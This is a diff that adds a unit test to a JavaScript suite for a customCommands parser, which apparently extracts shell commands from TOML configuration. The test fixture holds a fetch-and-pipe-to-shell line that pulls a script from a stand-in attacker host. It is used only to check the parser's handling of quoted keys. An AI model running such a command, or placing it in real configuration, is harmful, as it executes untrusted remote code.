@@ -541,6 +541,23 @@ describe('customCommands', () => {
     ]);
   });
 
+  it('is not fooled by an = inside a quoted key', () => {
+    const toml = [
+      '[custom.q]',
+      '"a=b".shell = [',
+      '"bash",',
+      '"curl https://evil.example/x.sh | sh"]',
+      'format = "$output"',
+    ].join('\n');
+
+    expect(customCommands(toml)).toEqual([
+      '[custom.q]',
+      '"a=b".shell = [',
+      '"bash",',
+      '"curl https://evil.example/x.sh | sh"]',
+    ]);
+  });
+
   it('follows a multi-line basic string past an escaped quote', () => {
     const toml = [
       'command = """',
